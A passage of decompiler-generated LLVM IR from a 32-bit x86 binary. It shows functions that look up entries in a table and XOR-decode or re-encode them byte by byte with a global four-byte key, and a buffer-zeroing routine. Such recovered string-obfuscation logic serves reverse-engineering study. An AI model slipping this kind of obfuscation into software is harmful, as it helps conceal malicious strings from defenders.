  uselistorder i32 %v0_804e09e, { 1, 0 }
  uselistorder i32 %v0_804e08b, { 2, 1, 0 }
  uselistorder i32 %v1_804e088, { 1, 0 }
  uselistorder i32 %v2_804e085, { 1, 0 }
  uselistorder i32 %v3_804e079, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_804e061, { 1, 0 }
  uselistorder i32 %v0_804e061, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e008, { 1, 0 }
  uselistorder i32 %v2_804dfc5, { 1, 0 }
  uselistorder i32 %v3_804dfc2, { 1, 0, 2, 3 }
  uselistorder i1 %v9_804df52, { 1, 0 }
  uselistorder i32 %v1_804df52, { 1, 0 }
  uselistorder i32 %v3_804df4f, { 1, 0, 2 }
  uselistorder i32 %v2_804df4d, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_804df32, { 1, 0 }
  uselistorder i32 %v0_804df32, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804df1d, { 1, 0 }
  uselistorder i32 %v3_804df1a, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804dfb7, { 1, 0 }
  uselistorder i32 %v1_804dfb4, { 2, 1, 0 }
  uselistorder i32 %v1_804deb8, { 1, 0 }
  uselistorder i32 %v1_804dead, { 1, 0 }
  uselistorder i32 %v0_804dead, { 1, 0 }
  uselistorder i32 %v0_804deb6, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804de8a, { 1, 0 }
  uselistorder i32 %v0_804de8a, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_804de7c, { 1, 0, 2 }
  uselistorder i32 %v4_804de3f, { 2, 1, 0 }
  uselistorder i32 %v3_804de0e, { 1, 0, 2 }
  uselistorder i32 %v0_804dd52, { 0, 2, 1 }
  uselistorder i32 %v0_804dd49, { 0, 3, 1, 2 }
  uselistorder i8 %v1_804dd21, { 1, 0 }
  uselistorder i32 %v0_804dd2a, { 1, 0 }
  uselistorder i8 %v1_804dcfc, { 1, 0 }
  uselistorder i8 %v2_804dcd6, { 1, 5, 6, 0, 3, 4, 2 }
  uselistorder i32 %v2_804dccd, { 10, 4, 9, 6, 1, 0, 2, 3, 7, 5, 8 }
  uselistorder i32 %v5_804dccb, { 0, 5, 4, 7, 6, 2, 3, 1 }
  uselistorder i32 %v1_804dcc5, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804dcc0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804dc74, { 1, 0 }
  uselistorder i32 %v0_804dbc4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804dbbf, { 1, 0 }
  uselistorder i32 %v1_804db9c, { 2, 1, 0 }
  uselistorder i32 %v0_804db84, { 3, 5, 2, 4, 0, 1 }
  uselistorder i32 %v0_804daaf, { 2, 0, 1 }
  uselistorder i32 %v0_804da73, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 5, 30, 6, 37, 3, 17, 7, 8, 9, 25, 26, 27, 28, 15, 19, 20, 21, 22, 23, 38, 39, 31, 53, 0, 1, 2, 55, 4, 59, 33, 34, 32, 10, 11, 12, 13, 14, 56, 16, 54, 18, 57, 24, 60, 29, 58, 35, 36, 61, 62, 63, 64, 65, 66, 40, 41, 44, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32* %ecx.global-to-local, { 14, 15, 16, 17, 18, 1, 5, 6, 8, 9, 10, 4, 7, 19, 0, 11, 2, 3, 12, 13, 34, 35, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %eax.global-to-local, { 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 137, 138, 139, 140, 141, 35, 157, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 227, 110, 111, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 9, 10, 11, 12, 13, 14, 15, 87, 88, 89, 90, 91, 92, 96, 48, 50, 49, 51, 52, 53, 54, 55, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 78, 79, 80, 81, 82, 83, 84, 97, 98, 99, 100, 101, 95, 102, 103, 104, 105, 106, 107, 168, 169, 170, 235, 142, 143, 144, 171, 172, 173, 174, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 145, 146, 147, 148, 149, 57, 58, 59, 60, 61, 62, 56, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 85, 86, 93, 94, 108, 109, 135, 136, 150, 151, 152, 153, 154, 155, 156, 228, 229, 230, 231, 232, 233, 234, 236, 0, 237, 238, 175, 176, 177, 225, 226, 178, 179, 180, 181, 182, 183, 184, 186, 187, 188, 189, 190, 194, 196, 195, 191, 192, 193, 185, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 46, 222, 224, 223, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221 }
  uselistorder i32 1848, { 1, 0, 2 }
  uselistorder i32 ()* @function_804f470, { 4, 1, 0, 2, 3 }
  uselistorder i32 1864, { 0, 4, 5, 12, 10, 15, 1, 2, 6, 7, 14, 3, 16, 8, 9, 13, 11 }
  uselistorder i32 ()* @function_804ed70, { 13, 5, 4, 14, 8, 6, 12, 3, 2, 1, 0, 9, 7, 15, 11, 10 }
  uselistorder i32 ()* @function_804ed40, { 8, 9, 3, 7, 1, 0, 4, 2, 10, 6, 5 }
  uselistorder i32 1872, { 5, 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @function_804edf0, { 8, 9, 3, 7, 1, 0, 4, 2, 10, 6, 5 }
  uselistorder i8 58, { 8, 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 ()* @function_804fff3, { 19, 18, 17, 16, 15, 14, 13, 2, 1, 21, 20, 8, 7, 4, 3, 10, 9, 6, 5, 23, 22, 12, 11, 0 }
  uselistorder i8 -5, { 2, 3, 0, 1 }
  uselistorder i8 -3, { 4, 5, 6, 3, 0, 1, 2 }
  uselistorder i32 1556, { 1, 0, 2 }
  uselistorder i32 1684, { 1, 0, 2 }
  uselistorder i32 ()* @function_804d580, { 3, 2, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i32 -28, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0, 2 }
  uselistorder i32 -20, { 1, 0, 2 }
  uselistorder i8 31, { 1, 2, 3, 0 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 10, { 1, 2, 3, 0 }
  uselistorder i8 127, { 1, 0 }
  uselistorder i32 ()* @function_804d350, { 2, 1, 0 }
  uselistorder i16* @global_var_8053a36.13, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 2, 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1852, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ebfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ebea, { 1, 0 }
  uselistorder label %dec_label_pc_804e0b5.backedge, { 22, 6, 13, 8, 16, 11, 2, 15, 1, 4, 17, 5, 19, 7, 9, 20, 10, 18, 12, 21, 14, 0, 3 }
  uselistorder label %dec_label_pc_804eb08, { 1, 0 }
  uselistorder label %dec_label_pc_804e86d, { 1, 0 }
  uselistorder label %dec_label_pc_804e7b7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e729, { 1, 5, 2, 7, 4, 6, 0, 3, 8 }
  uselistorder label %dec_label_pc_804e6e7, { 1, 0 }
  uselistorder label %dec_label_pc_804e688, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e56f, { 1, 0 }
  uselistorder label %dec_label_pc_804e140.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804e4d2, { 1, 0 }
  uselistorder label %dec_label_pc_804e4c6, { 1, 0 }
  uselistorder label %dec_label_pc_804e4c6.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804e4a2, { 1, 0 }
  uselistorder label %dec_label_pc_804e44f, { 1, 0 }
  uselistorder label %dec_label_pc_804e423, { 1, 0 }
  uselistorder label %dec_label_pc_804e418, { 3, 2, 7, 4, 9, 6, 0, 8, 1, 11, 5, 10 }
  uselistorder label %dec_label_pc_804e32a, { 1, 0 }
  uselistorder label %dec_label_pc_804e31e, { 1, 0 }
  uselistorder label %dec_label_pc_804e31e.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804e2fa, { 1, 0 }
  uselistorder label %dec_label_pc_804e2a1, { 1, 0 }
  uselistorder label %dec_label_pc_804e25c, { 1, 0 }
  uselistorder label %dec_label_pc_804e21c, { 1, 0 }
  uselistorder label %dec_label_pc_804e1d6, { 1, 0 }
  uselistorder label %dec_label_pc_804e1b6, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804e195, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e182, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e170, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804e144, { 1, 0 }
  uselistorder label %dec_label_pc_804e144.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e117, { 1, 0 }
  uselistorder label %dec_label_pc_804e112, { 1, 0 }
  uselistorder label %dec_label_pc_804e0d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e0bc, { 1, 0 }
  uselistorder label %dec_label_pc_804e09e, { 1, 0 }
  uselistorder label %dec_label_pc_804e052, { 5, 0, 6, 7, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_804e02a, { 1, 0 }
  uselistorder label %dec_label_pc_804df57, { 1, 0 }
  uselistorder label %dec_label_pc_804df23, { 3, 4, 0, 1, 5, 6, 2 }
  uselistorder label %dec_label_pc_804ded6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804dead, { 1, 0 }
  uselistorder label %dec_label_pc_804ddc6, { 9, 1, 2, 3, 4, 5, 0, 6, 7, 8, 10 }
  uselistorder label %dec_label_pc_804ddbb, { 1, 0 }
  uselistorder label %dec_label_pc_804dd5b, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804dd40, { 1, 0 }
  uselistorder label %dec_label_pc_804dd0a, { 1, 0 }
  uselistorder label %dec_label_pc_804dcc0, { 6, 7, 0, 1, 2, 5, 4, 3, 8 }
  uselistorder label %dec_label_pc_804dcc0.preheader, { 21, 17, 20, 16, 19, 15, 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 18 }
  uselistorder label %dec_label_pc_804db0e, { 3, 0, 4, 1, 2 }
  uselistorder label %dec_label_pc_804dac1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804daaf, { 1, 2, 0 }
}

define i32 @function_804ed40() local_unnamed_addr {
dec_label_pc_804ed40:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_804ed48 = icmp eq i32 %tmp, 0
  %v1_804ed4a = mul i32 %tmp2, 8
  store i32 %v1_804ed4a, i32* %edx.global-to-local, align 4
  br i1 %v1_804ed48, label %dec_label_pc_804ed63, label %dec_label_pc_804ed59

dec_label_pc_804ed59:                             ; preds = %dec_label_pc_804ed40
  %v1_804ed59 = add i32 %v1_804ed4a, add (i32 ptrtoint (i32* @global_var_8053ac0.27 to i32), i32 4)
  %v2_804ed59 = inttoptr i32 %v1_804ed59 to i32*
  %v3_804ed59 = load i32, i32* %v2_804ed59, align 4
  %v1_804ed5c = urem i32 %v3_804ed59, 65536
  %v2_804ed61 = inttoptr i32 %tmp to i32*
  store i32 %v1_804ed5c, i32* %v2_804ed61, align 4
  %v0_804ed63.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ed63

dec_label_pc_804ed63:                             ; preds = %dec_label_pc_804ed40, %dec_label_pc_804ed59
  %v0_804ed63 = phi i32 [ %v1_804ed4a, %dec_label_pc_804ed40 ], [ %v0_804ed63.pre, %dec_label_pc_804ed59 ]
  %v1_804ed63 = add i32 %v0_804ed63, ptrtoint (i32* @global_var_8053ac0.27 to i32)
  %v2_804ed63 = inttoptr i32 %v1_804ed63 to i32*
  %v3_804ed63 = load i32, i32* %v2_804ed63, align 4
  ret i32 %v3_804ed63

; uselistorder directives
  uselistorder label %dec_label_pc_804ed63, { 1, 0 }
}

define i32 @function_804ed70() local_unnamed_addr {
dec_label_pc_804ed70:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804ed79 = zext i8 %tmp to i32
  %v1_804ed7d = mul nuw nsw i32 %v4_804ed79, 8
  %v2_804ed7d = add i32 %v1_804ed7d, ptrtoint (i32* @global_var_8053ac0.27 to i32)
  store i32 %v2_804ed7d, i32* %ecx.global-to-local, align 4
  %v0_804ed84 = load i16, i16* @global_var_8053958.28, align 2
  %v1_804ed84 = sext i16 %v0_804ed84 to i32
  %v1_804ed89 = add i32 %v1_804ed7d, add (i32 ptrtoint (i32* @global_var_8053ac0.27 to i32), i32 4)
  %v2_804ed89 = inttoptr i32 %v1_804ed89 to i16*
  %v3_804ed89 = load i16, i16* %v2_804ed89, align 4
  %v4_804ed89 = icmp eq i16 %v3_804ed89, 0
  br i1 %v4_804ed89, label %dec_label_pc_804edda, label %dec_label_pc_804ed90

dec_label_pc_804ed90:                             ; preds = %dec_label_pc_804ed70
  store i32 %v1_804ed84, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804ed98 = udiv i32 %v1_804ed84, 16777216
  %v2_804ed9b = udiv i32 %v1_804ed84, 256
  store i32 %v2_804ed9b, i32* %edi.global-to-local, align 4
  %v5_804ed9e = trunc i32 %v2_804ed98 to i8
  store i8 %v5_804ed9e, i8* %stack_var_-44, align 1
  %v2_804eda1 = udiv i32 %v1_804ed84, 65536
  store i32 %v2_804eda1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804eda4

dec_label_pc_804eda4:                             ; preds = %dec_label_pc_804eda4.dec_label_pc_804eda4_crit_edge, %dec_label_pc_804ed90
  %v0_804edaa = phi i32 [ %v0_804edaa.pre, %dec_label_pc_804eda4.dec_label_pc_804eda4_crit_edge ], [ %v1_804ed84, %dec_label_pc_804ed90 ]
  %v0_804eda6 = phi i32 [ %v1_804edd6, %dec_label_pc_804eda4.dec_label_pc_804eda4_crit_edge ], [ 0, %dec_label_pc_804ed90 ]
  %v0_804eda4 = phi i32 [ %v0_804edce, %dec_label_pc_804eda4.dec_label_pc_804eda4_crit_edge ], [ %v2_804ed7d, %dec_label_pc_804ed90 ]
  %v1_804eda4 = inttoptr i32 %v0_804eda4 to i32*
  %v2_804eda4 = load i32, i32* %v1_804eda4, align 4
  %v2_804eda8 = add i32 %v2_804eda4, %v0_804eda6
  %v1_804edac = inttoptr i32 %v2_804eda8 to i8*
  %v2_804edac = load i8, i8* %v1_804edac, align 1
  %v4_804edac = trunc i32 %v0_804edaa to i8
  %v5_804edac = xor i8 %v2_804edac, %v4_804edac
  store i8 %v5_804edac, i8* %v1_804edac, align 1
  %v0_804edae = load i32, i32* %edx.global-to-local, align 4
  %v0_804edb0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804edb0 = inttoptr i32 %v0_804edb0 to i32*
  %v2_804edb0 = load i32, i32* %v1_804edb0, align 4
  %v2_804edb2 = add i32 %v2_804edb0, %v0_804edae
  %v0_804edb4 = load i32, i32* %edi.global-to-local, align 4
  %v1_804edb6 = inttoptr i32 %v2_804edb2 to i8*
  %v2_804edb6 = load i8, i8* %v1_804edb6, align 1
  %v4_804edb6 = trunc i32 %v0_804edb4 to i8
  %v5_804edb6 = xor i8 %v2_804edb6, %v4_804edb6
  store i8 %v5_804edb6, i8* %v1_804edb6, align 1
  %v0_804edb8 = load i32, i32* %edx.global-to-local, align 4
  %v0_804edba = load i32, i32* %ecx.global-to-local, align 4
  %v1_804edba = inttoptr i32 %v0_804edba to i32*
  %v2_804edba = load i32, i32* %v1_804edba, align 4
  %v2_804edbc = add i32 %v2_804edba, %v0_804edb8
  %v0_804edbe = load i32, i32* %esi.global-to-local, align 4
  %v1_804edc0 = inttoptr i32 %v2_804edbc to i8*
  %v2_804edc0 = load i8, i8* %v1_804edc0, align 1
  %v4_804edc0 = trunc i32 %v0_804edbe to i8
  %v5_804edc0 = xor i8 %v2_804edc0, %v4_804edc0
  store i8 %v5_804edc0, i8* %v1_804edc0, align 1
  %v0_804edc2 = load i32, i32* %edx.global-to-local, align 4
  %v0_804edc4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804edc4 = inttoptr i32 %v0_804edc4 to i32*
  %v2_804edc4 = load i32, i32* %v1_804edc4, align 4
  %v1_804edc6 = add i32 %v0_804edc2, 1
  store i32 %v1_804edc6, i32* %edx.global-to-local, align 4
  %v2_804edc7 = add i32 %v2_804edc4, %v0_804edc2
  %v2_804edc9 = load i8, i8* %stack_var_-44, align 1
  %v1_804edcc = inttoptr i32 %v2_804edc7 to i8*
  %v2_804edcc = load i8, i8* %v1_804edcc, align 1
  %v5_804edcc = xor i8 %v2_804edcc, %v2_804edc9
  store i8 %v5_804edcc, i8* %v1_804edcc, align 1
  %v0_804edce = load i32, i32* %ecx.global-to-local, align 4
  %v1_804edce = add i32 %v0_804edce, 4
  %v2_804edce = inttoptr i32 %v1_804edce to i32*
  %v3_804edce = load i32, i32* %v2_804edce, align 4
  %v1_804edd1 = urem i32 %v3_804edce, 65536
  %v1_804edd6 = load i32, i32* %edx.global-to-local, align 4
  %v8_804edd8 = icmp sgt i32 %v1_804edd1, %v1_804edd6
  br i1 %v8_804edd8, label %dec_label_pc_804eda4.dec_label_pc_804eda4_crit_edge, label %dec_label_pc_804edda

dec_label_pc_804eda4.dec_label_pc_804eda4_crit_edge: ; preds = %dec_label_pc_804eda4
  %v0_804edaa.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804eda4

dec_label_pc_804edda:                             ; preds = %dec_label_pc_804eda4, %dec_label_pc_804ed70
  %v0_804ede1 = phi i32 [ %v1_804ed84, %dec_label_pc_804ed70 ], [ %v1_804edd1, %dec_label_pc_804eda4 ]
  ret i32 %v0_804ede1

; uselistorder directives
  uselistorder i32 %v1_804edd6, { 1, 0 }
  uselistorder i32 %v1_804edd1, { 1, 0 }
  uselistorder i32 %v0_804edce, { 1, 0 }
  uselistorder i32 %v1_804ed84, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_804edf0() local_unnamed_addr {
dec_label_pc_804edf0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804edf9 = zext i8 %tmp to i32
  %v1_804edfd = mul nuw nsw i32 %v4_804edf9, 8
  %v2_804edfd = add i32 %v1_804edfd, ptrtoint (i32* @global_var_8053ac0.27 to i32)
  store i32 %v2_804edfd, i32* %ecx.global-to-local, align 4
  %v0_804ee04 = load i16, i16* @global_var_8053958.28, align 2
  %v1_804ee04 = sext i16 %v0_804ee04 to i32
  %v1_804ee09 = add i32 %v1_804edfd, add (i32 ptrtoint (i32* @global_var_8053ac0.27 to i32), i32 4)
  %v2_804ee09 = inttoptr i32 %v1_804ee09 to i16*
  %v3_804ee09 = load i16, i16* %v2_804ee09, align 4
  %v4_804ee09 = icmp eq i16 %v3_804ee09, 0
  br i1 %v4_804ee09, label %dec_label_pc_804ee5a, label %dec_label_pc_804ee10

dec_label_pc_804ee10:                             ; preds = %dec_label_pc_804edf0
  store i32 %v1_804ee04, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_804ee18 = udiv i32 %v1_804ee04, 16777216
  %v2_804ee1b = udiv i32 %v1_804ee04, 256
  store i32 %v2_804ee1b, i32* %edi.global-to-local, align 4
  %v5_804ee1e = trunc i32 %v2_804ee18 to i8
  store i8 %v5_804ee1e, i8* %stack_var_-44, align 1
  %v2_804ee21 = udiv i32 %v1_804ee04, 65536
  store i32 %v2_804ee21, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ee24

dec_label_pc_804ee24:                             ; preds = %dec_label_pc_804ee24.dec_label_pc_804ee24_crit_edge, %dec_label_pc_804ee10
  %v0_804ee2a = phi i32 [ %v0_804ee2a.pre, %dec_label_pc_804ee24.dec_label_pc_804ee24_crit_edge ], [ %v1_804ee04, %dec_label_pc_804ee10 ]
  %v0_804ee26 = phi i32 [ %v1_804ee56, %dec_label_pc_804ee24.dec_label_pc_804ee24_crit_edge ], [ 0, %dec_label_pc_804ee10 ]
  %v0_804ee24 = phi i32 [ %v0_804ee4e, %dec_label_pc_804ee24.dec_label_pc_804ee24_crit_edge ], [ %v2_804edfd, %dec_label_pc_804ee10 ]
  %v1_804ee24 = inttoptr i32 %v0_804ee24 to i32*
  %v2_804ee24 = load i32, i32* %v1_804ee24, align 4
  %v2_804ee28 = add i32 %v2_804ee24, %v0_804ee26
  %v1_804ee2c = inttoptr i32 %v2_804ee28 to i8*
  %v2_804ee2c = load i8, i8* %v1_804ee2c, align 1
  %v4_804ee2c = trunc i32 %v0_804ee2a to i8
  %v5_804ee2c = xor i8 %v2_804ee2c, %v4_804ee2c
  store i8 %v5_804ee2c, i8* %v1_804ee2c, align 1
  %v0_804ee2e = load i32, i32* @edx, align 4
  %v0_804ee30 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ee30 = inttoptr i32 %v0_804ee30 to i32*
  %v2_804ee30 = load i32, i32* %v1_804ee30, align 4
  %v2_804ee32 = add i32 %v2_804ee30, %v0_804ee2e
  %v0_804ee34 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ee36 = inttoptr i32 %v2_804ee32 to i8*
  %v2_804ee36 = load i8, i8* %v1_804ee36, align 1
  %v4_804ee36 = trunc i32 %v0_804ee34 to i8
  %v5_804ee36 = xor i8 %v2_804ee36, %v4_804ee36
  store i8 %v5_804ee36, i8* %v1_804ee36, align 1
  %v0_804ee38 = load i32, i32* @edx, align 4
  %v0_804ee3a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ee3a = inttoptr i32 %v0_804ee3a to i32*
  %v2_804ee3a = load i32, i32* %v1_804ee3a, align 4
  %v2_804ee3c = add i32 %v2_804ee3a, %v0_804ee38
  %v0_804ee3e = load i32, i32* %esi.global-to-local, align 4
  %v1_804ee40 = inttoptr i32 %v2_804ee3c to i8*
  %v2_804ee40 = load i8, i8* %v1_804ee40, align 1
  %v4_804ee40 = trunc i32 %v0_804ee3e to i8
  %v5_804ee40 = xor i8 %v2_804ee40, %v4_804ee40
  store i8 %v5_804ee40, i8* %v1_804ee40, align 1
  %v0_804ee42 = load i32, i32* @edx, align 4
  %v0_804ee44 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ee44 = inttoptr i32 %v0_804ee44 to i32*
  %v2_804ee44 = load i32, i32* %v1_804ee44, align 4
  %v1_804ee46 = add i32 %v0_804ee42, 1
  store i32 %v1_804ee46, i32* @edx, align 4
  %v2_804ee47 = add i32 %v2_804ee44, %v0_804ee42
  %v2_804ee49 = load i8, i8* %stack_var_-44, align 1
  %v1_804ee4c = inttoptr i32 %v2_804ee47 to i8*
  %v2_804ee4c = load i8, i8* %v1_804ee4c, align 1
  %v5_804ee4c = xor i8 %v2_804ee4c, %v2_804ee49
  store i8 %v5_804ee4c, i8* %v1_804ee4c, align 1
  %v0_804ee4e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ee4e = add i32 %v0_804ee4e, 4
  %v2_804ee4e = inttoptr i32 %v1_804ee4e to i32*
  %v3_804ee4e = load i32, i32* %v2_804ee4e, align 4
  %v1_804ee51 = urem i32 %v3_804ee4e, 65536
  %v1_804ee56 = load i32, i32* @edx, align 4
  %v8_804ee58 = icmp sgt i32 %v1_804ee51, %v1_804ee56
  br i1 %v8_804ee58, label %dec_label_pc_804ee24.dec_label_pc_804ee24_crit_edge, label %dec_label_pc_804ee5a

dec_label_pc_804ee24.dec_label_pc_804ee24_crit_edge: ; preds = %dec_label_pc_804ee24
  %v0_804ee2a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ee24

dec_label_pc_804ee5a:                             ; preds = %dec_label_pc_804ee24, %dec_label_pc_804edf0
  %v0_804ee61 = phi i32 [ %v1_804ee04, %dec_label_pc_804edf0 ], [ %v1_804ee51, %dec_label_pc_804ee24 ]
  ret i32 %v0_804ee61

; uselistorder directives
  uselistorder i32 %v1_804ee56, { 1, 0 }
  uselistorder i32 %v1_804ee51, { 1, 0 }
  uselistorder i32 %v0_804ee4e, { 1, 0 }
  uselistorder i32 %v1_804ee04, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8053ac0.27 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_8053958.28, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8053ac0.27 to i32), { 1, 2, 3, 0 }
}

define i32 @function_804f450(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f450:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804f458 = icmp eq i32 %arg2, 0
  br i1 %v1_804f458, label %dec_label_pc_804f450.dec_label_pc_804f469_crit_edge, label %dec_label_pc_804f45c

dec_label_pc_804f450.dec_label_pc_804f469_crit_edge: ; preds = %dec_label_pc_804f450
  %v0_804f469.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f469

dec_label_pc_804f45c:                             ; preds = %dec_label_pc_804f450
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804f4605 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_804f4605, align 1
  %v0_804f4646 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f4647 = add i32 %v0_804f4646, 1
  store i32 %v1_804f4647, i32* %eax.global-to-local, align 4
  %v12_804f4658 = icmp eq i32 %v1_804f4647, %arg2
  %v1_804f4679 = icmp eq i1 %v12_804f4658, false
  br i1 %v1_804f4679, label %dec_label_pc_804f460.dec_label_pc_804f460_crit_edge, label %dec_label_pc_804f469

dec_label_pc_804f460.dec_label_pc_804f460_crit_edge: ; preds = %dec_label_pc_804f45c, %dec_label_pc_804f460.dec_label_pc_804f460_crit_edge
  %v1_804f46410 = phi i32 [ %v1_804f464, %dec_label_pc_804f460.dec_label_pc_804f460_crit_edge ], [ %v1_804f4647, %dec_label_pc_804f45c ]
  %v1_804f460.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f460 = add i32 %v1_804f46410, %v1_804f460.pre
  %v3_804f460 = inttoptr i32 %v2_804f460 to i8*
  store i8 0, i8* %v3_804f460, align 1
  %v0_804f464 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f464 = add i32 %v0_804f464, 1
  store i32 %v1_804f464, i32* %eax.global-to-local, align 4
  %v12_804f465 = icmp eq i32 %v1_804f464, %arg2
  %v1_804f467 = icmp eq i1 %v12_804f465, false
  br i1 %v1_804f467, label %dec_label_pc_804f460.dec_label_pc_804f460_crit_edge, label %dec_label_pc_804f469

dec_label_pc_804f469:                             ; preds = %dec_label_pc_804f45c, %dec_label_pc_804f460.dec_label_pc_804f460_crit_edge, %dec_label_pc_804f450.dec_label_pc_804f469_crit_edge
  %v0_804f469 = phi i32 [ %v0_804f469.pre, %dec_label_pc_804f450.dec_label_pc_804f469_crit_edge ], [ %v1_804f4647, %dec_label_pc_804f45c ], [ %v1_804f464, %dec_label_pc_804f460.dec_label_pc_804f460_crit_edge ]
  ret i32 %v0_804f469

; uselistorder directives
  uselistorder i32 %v1_804f464, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f469, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f460.dec_label_pc_804f460_crit_edge, { 1, 0 }
}

define i32 @function_804f470() local_unnamed_addr {
dec_label_pc_804f470:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %v7_804f485 = icmp sgt i32 %tmp9, %tmp10
  %tmp17 = icmp slt i32 %tmp10, 1
  %or.cond = or i1 %v7_804f485, %tmp17
  br i1 %or.cond, label %dec_label_pc_804f48a, label %dec_label_pc_804f494

dec_label_pc_804f48a:                             ; preds = %dec_label_pc_804f4a2, %dec_label_pc_804f4b5, %dec_label_pc_804f470
  %storemerge = phi i32 [ -1, %dec_label_pc_804f470 ], [ -1, %dec_label_pc_804f4a2 ], [ %v0_804f4a3, %dec_label_pc_804f4b5 ]
  ret i32 %storemerge

dec_label_pc_804f494:                             ; preds = %dec_label_pc_804f470
  %v2_804f4ac = add i32 %tmp, -1
  br label %dec_label_pc_804f4a8

dec_label_pc_804f4a0:                             ; preds = %dec_label_pc_804f4a8
  br label %dec_label_pc_804f4a2

